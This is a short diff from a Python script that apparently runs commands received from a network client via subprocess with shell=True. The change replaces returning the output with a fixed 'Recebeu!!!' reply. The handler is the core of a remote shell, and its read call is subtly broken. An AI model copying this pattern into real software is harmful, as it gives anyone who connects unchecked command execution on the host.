@@ -33,7 +33,7 @@ def cmd(client, data):
     try:
         proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = proc.stdout.read #+ proc.stderr.read
-        client.send(output)
+        client.send("Recebeu!!!")
     except Exception as Error:
         print('ERROR: ', Error)
 
